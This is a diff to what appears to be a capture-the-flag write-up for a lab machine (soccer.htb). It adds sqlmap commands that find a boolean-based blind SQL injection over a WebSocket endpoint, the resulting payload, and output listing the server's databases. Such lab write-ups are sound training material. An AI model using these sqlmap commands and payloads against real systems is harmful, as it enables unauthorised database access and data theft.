@@ -248,5 +248,26 @@ We then open BurpSuite to intercept the request when entering the SQL injection 
 ```
 We can then copy to file and use this with sqlmap specifying WebSocket:
 ```
-sqlmap -u 'ws://soc-player.soccer.htb:9091/' -d '{"id":"*"}' --batch
+sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch
+```
+where we find a boolean-based blind sql injection:
+```
+sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:
+---
+Parameter: JSON #1* ((custom) POST)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause
+    Payload: {"id":"-9663 OR 8964=8964"}
+
+```
+Now we add the --dbs subcommand to get the list of databases 
+```
+sqlmap -u 'ws://soc-player.soccer.htb:9091/' --data '{"id":"*"}' --technique=B --risk 3 --level 5 --batch --dbs --threads 10
+
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] soccer_db
+[*] sys
 ```
